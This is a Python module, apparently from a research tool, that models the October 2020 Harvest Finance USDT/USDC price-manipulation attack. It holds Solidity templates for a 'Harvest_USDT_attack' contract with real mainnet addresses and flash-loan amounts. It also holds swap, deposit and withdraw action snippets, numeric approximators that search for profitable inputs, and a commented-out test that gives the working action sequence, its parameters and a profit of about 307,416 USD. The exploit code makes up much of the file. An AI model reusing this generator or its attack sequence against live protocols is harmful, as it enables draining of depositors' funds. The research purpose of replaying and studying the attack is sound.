import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class Harvest_USDTAction():

    initialStates = [59730435, 48068621, 72825240, 52212225, 127588335]
    globalStates = [59730435, 48068621, 72825240, 52212225, 127588335]
    # globalStates[0]: USDC_liquidity  59730435
    # globalStates[1]: USDT_liquidity  48068621
    # globalStates[2]: fUSDC underlying balance   72825240
    # globalStates[3]: invested underlying balance   52212225
    # globalStates[4]: fUSDC total supply   127588335

    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/Harvest_USDTI.sol";
// 0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877

// Block 11129474
// Block index 0
// Timestamp Mon, 26 Oct 2020 02:53:58 +0000
// Gas price 525 gwei
// Gas limit 12065986

contract Harvest_USDT_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapETHUSDTAddress = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant UniswapETHUSDCAddress = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant yUSDCAddress = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address private constant CurveFiAddress = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address private constant fFarmAddress = 0x9B3bE0cc5dD26fd0254088d03D8206792715588B;
    address private constant VaultProxyAddress = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    address private constant StrategyAddress = 0xD55aDA00494D96CE1029C201425249F9dFD216cc;


    IUSDT USDT = IUSDT(USDTAddress);
    IUSDC USDC = IUSDC(USDCAddress);
    yUSDC _yUSDC = yUSDC(yUSDCAddress);
    yERC20 CURVE_yPool = yERC20(CurveFiAddress);
    IERC20 VaultERC = IERC20(VaultProxyAddress);
    IfUSDC fUSDC = IfUSDC(VaultProxyAddress);
    IStrategy Strategy = IStrategy(StrategyAddress);



    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    string str80 = "";
    string str81 = "";
    string str82 = "";


    constructor() payable {
        StandardToken(USDTAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(CurveFiAddress, 2**256 - 1);
        StandardToken(USDCAddress).approve(VaultProxyAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}
    '''

    startStr_attack = '''
                    
    // loan amount = 18308555.417594 USDT and 5000 0000 USDC
    function attack( $$_$$ ) public {

    '''

    endStr_attack = """

        revert(ProfitSummary());

        // current balance      : 18317289.039415 USDT and 50298684 USDC
        // compared to flashloan: 18308555.417594 USDT and 50000000 USDC
        // Profit                    8734        USDT and    298684 USDC
        // Total Profit:             307418
    }

    """  

    endStr_contract = """
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this));
        uint balance2 = USDC.balanceOf(address(this));
        str1 = append("USDT balance: ", uint2str(balance1 / 10 ** 6));
        str2 = append(" || USDC balance: ", uint2str(balance2 / 10 ** 6));
        return append(str1, str2);
    }

    function CurveSummary() internal returns (string memory _uintAsString){
        uint balance1 = CURVE_yPool.balances(1) / 10 ** 6;
        uint balance2 = CURVE_yPool.balances(2) / 10 ** 6;
        return append(append("Curve USDC balance: ", uint2str(balance1)), append( "  Curve USDT balance: ", uint2str(balance2)));
    }

    function fUSDCSummary_invested_underlying() internal returns (string memory _uintAsString){
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        str81 = append("invested underlying balance: ", uint2str(invested));
        return str81;
    }


    function fUSDCSummary_rest() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(str80 , str82);
    }


    function fUSDCSummary() internal returns (string memory _uintAsString){
        uint underlyingBalance =  fUSDC.underlyingBalanceInVault() / 10 ** 6;
        uint invested = Strategy.investedUnderlyingBalance() / 10 ** 6;
        uint totalSupply = fUSDC.totalSupply() / 10 ** 6;
        str80 = append("fUSDC underlying balance: ", uint2str(underlyingBalance));
        str81 = append("invested underlying balance: ", uint2str(invested));
        str82 = append("fUSDC total supply: ", uint2str(totalSupply));
        return appendWithSpace(appendWithSpace(str80 , str81), str82);
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}

                """
    
    initialBalances = {"USDT": 18308555.417594, "USDC": 50000000}
    currentBalances = {"USDT": 18308555.417594, "USDC": 50000000}
    TargetTokens = {'USDT', 'USDC'}
    TokenPrices = {"USDT": 1.0, "USDC": 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        profit = stats[0] - 50000000 + stats[1] - 18308555.417594
        return profit


    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    

    def initialPass():
        action1 = Curve_USDT2USDC
        action2 = Curve_USDC2USDT
        action3 = fUSDC_deposit
        action4 = fUSDC_withdraw
        action_list_1 = [action1, action2, action3, action4]

        action1_prestate_dependency = [action1, action2]
        action2_prestate_dependency = [action1, action2]
        action3_prestate_dependency = [action1, action2]
        action4_prestate_dependency = [action1, action2, action3]

        # seq of actions
        ActionWrapper = Harvest_USDTAction
        action_lists = [action1_prestate_dependency + [action1], action2_prestate_dependency + [action2], action3_prestate_dependency + [action3], 
                        action4_prestate_dependency + [action4]]

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return


class Curve_USDT2USDC(Harvest_USDTAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None        

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['USDC']
    range = [0, 20000000]  # 17222012

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDT2USDC\n"
        action += '''      CURVE_yPool.exchange_underlying(2, 1, $$ * 10 ** 6, 0);  \n'''
        return action


    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDT2USDC\n"
        action += '''                 str1 = CurveSummary();
        str2 = fUSDCSummary_invested_underlying(); 
        uint USDCgot = USDC.balanceOf(address(this));
        CURVE_yPool.exchange_underlying(2, 1, $$ * 10 ** 6, 0); // USDT to USDC
        str3 = CurveSummary();
        str4 = fUSDCSummary_invested_underlying();
        USDCgot = USDC.balanceOf(address(this)) - USDCgot;
        revert(appendWithSpace( appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace( str4, uint2str( USDCgot / 1e6)))));
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3 = cls.aliquotValues(values)
        cls.values[0].append( v0 )  # Curve USDC balance
        cls.values[1].append( v1 )  # Curve USDT balance
        cls.values[2].append( v2 )  # invested underlying balance
        cls.values[3].append( v3 )  # USDCOut

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        # print("For action: ", )
        # print(cls.__name__)
        # print("approximator0")
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, 3])
        # print("approximator1")
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, 3])
        # print("approximator2")
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        # print("approximator3")
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0, 1, 3])
        
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):

        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[3], input]

        new_inputs = [inputs[0], inputs[1], inputs[3]]

        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDT'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[3] = output2
        cls.currentBalances["USDC"] += output3
        return



    @classmethod
    def string(cls):
        return cls.__name__



class Curve_USDC2USDT(Harvest_USDTAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None  

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['USDT']
    range = [0, 20000000]   # 17239234
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDC2USDT\n"
        action += '''       CURVE_yPool.exchange_underlying(1, 2, $$ * 10 ** 6, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDC2USDT\n"
        action += '''
        str1 = CurveSummary();
        str2 = fUSDCSummary_invested_underlying();
        uint USDTgot = USDT.balanceOf( address(this) );
        CURVE_yPool.exchange_underlying(1, 2, $$ * 1e6, 0);  
        str3 = CurveSummary();
        str4 = fUSDCSummary_invested_underlying();
        USDTgot = USDT.balanceOf( address(this) ) - USDTgot;
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace( str4, uint2str(USDTgot / 10 ** 6) ))));
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[3], values[4], values[5], values[6]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3 = cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve USDC balance
        cls.values[1].append(v1)  # Curve USDT balance
        cls.values[2].append(v2)  # invested underlying balance
        cls.values[3].append(v3)  # USDTOut

        cls.hasNewDataPoints = True

        return 1


    @classmethod
    def refreshTransitFormula(cls):

        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0, 1, 3])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0, 1, 3])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0, 1, 3])

        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[3], input]
        
        new_inputs = [inputs[0], inputs[1], inputs[3]]       
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)
        
        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDC'] -= input
        output0, output1, output2, output3 = cls.simulate(input)
        
        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[3] = output2
        cls.currentBalances["USDT"] += output3
        return


    @classmethod
    def string(cls):
        return cls.__name__



class fUSDC_deposit(Harvest_USDTAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None    

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['fUSDC']
    range = [0, 50000000]  # 49977468

    @classmethod
    def actionStr(cls):
        action = "      // Action: fUSDC_deposit\n"
        action += '''      fUSDC.deposit($$ * 1e6); \n'''
        return action

    @classmethod
    def collectorStr(cls):

        action = "      // Collect: fUSDC_deposit\n"
        action += '''              str1 = fUSDCSummary();
        uint fUSDCgot = fUSDC.balanceOf(address(this));
        fUSDC.deposit($$ * 1e6);
        fUSDCgot = fUSDC.balanceOf(address(this)) - fUSDCgot;
        str2 = fUSDCSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(fUSDCgot / 10 ** 6) ));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[5], values[6]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append( point ) 

        v0, v1, v2 = cls.aliquotValues( values )

        cls.values[0].append( v0 )  # fUSDC underlying balance
        cls.values[1].append( v1 )  # fUSDC total supply
        cls.values[2].append( v2 )  # fUSDCOut

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):

        inputs = [cls.globalStates[2], cls.globalStates[3], \
        cls.globalStates[4], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2




    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances['USDC'] -= input
        output0, output1, output2 = cls.simulate(input)
        cls.globalStates[2] = output0
        cls.globalStates[4] = output1
        if "fUSDC" not in cls.currentBalances:
            cls.currentBalances["fUSDC"] = 0
        cls.currentBalances["fUSDC"] += output2
        return


    @classmethod
    def string(cls):
        return cls.__name__




class fUSDC_withdraw(Harvest_USDTAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None


    numInputs = 1
    tokensIn = ['fUSDC']
    tokensOut = ['USDC']
    range = [0, 60000000]  # 51456280


    @classmethod
    def actionStr(cls):
        action = "      // Action: fUSDC_withdraw\n"
        action += '''      fUSDC.withdraw($$ * 10 ** 6); \n'''
        return action


    @classmethod
    def collectorStr(cls):
        action = "      // Collect: fUSDC_withdraw\n"
        action += '''       str1 = fUSDCSummary();
        uint USDCgot = USDC.balanceOf( address(this) );
        fUSDC.withdraw($$ * 10 ** 6);  
        str2 = fUSDCSummary();
        USDCgot = USDC.balanceOf( address(this) ) - USDCgot;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(USDCgot / 10 ** 6) ));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[5], values[6]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1

        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 
        v0, v1, v2 = cls.aliquotValues(values)

        cls.values[0].append( v0 )  # fUSDC underlying balance
        cls.values[1].append( v1 )  # fUSDC total supply
        cls.values[2].append( v2 )  # USDCgot

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[2], cls.globalStates[3], \
        cls.globalStates[4], input]
        
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        
        cls.currentBalances['fUSDC'] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[2] = output0
        cls.globalStates[4] = output1
        cls.currentBalances["USDC"] += output2
        return


    @classmethod
    def string(cls):
        return cls.__name__



def main():
    # config.method 
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom


    config.method = 1
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 200000
    config.blockNum = 11129474
    config.contract_name = "Harvest_USDT_attack"


# Test for initial pass of data collecton: 
    Harvest_USDTAction.initialPass()
    
#     Harvest_USDTAction.runinitialPass()
    

# # Test for correct sequence of actions and correct sequence of parameters
#     initial_guess = [17222012, 49977468, 17239234, 51456280]

#     action1 = Curve_USDT2USDC
#     action2 = fUSDC_deposit
#     action3 = Curve_USDC2USDT
#     action4 = fUSDC_withdraw
#     action_list = [action1, action2, action3, action4]
#     ActionWrapper = Harvest_USDTAction


#     # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

#     actual_profit = 307416.5824059993
#     print("actual profit: ", actual_profit)
#     e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
#     return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    